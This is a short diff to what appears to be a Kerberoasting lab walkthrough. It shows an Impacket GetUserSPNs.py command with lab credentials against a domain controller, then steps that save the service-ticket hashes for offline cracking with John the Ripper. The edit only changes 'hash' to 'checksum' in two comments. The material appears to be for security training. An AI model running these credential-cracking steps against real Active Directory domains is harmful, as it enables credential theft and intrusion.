@@ -42,10 +42,10 @@ python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.5
 
 # Step 3: Save the outputs, each in their own txt file. cd to a location where you can create files. We saved them in Documents.
 
-# extract the easy "ticket" (hash + enc ticket) ; corresponding to account with weak password to a txt file
+# extract the easy "ticket" (checksum + enc ticket) ; corresponding to account with weak password to a txt file
 echo 'manually copy the output value here' > easy_output.txt
 
-# extract the hard "ticket" (hash + enc ticket); corresponding to account with strong password to a txt file
+# extract the hard "ticket" (checksum + enc ticket); corresponding to account with strong password to a txt file
 echo 'manually copy the output value here' > hard_output.txt
 
 # Step 4: use John the Ripper to crack the passwords. To get the tool: sudo apt install john
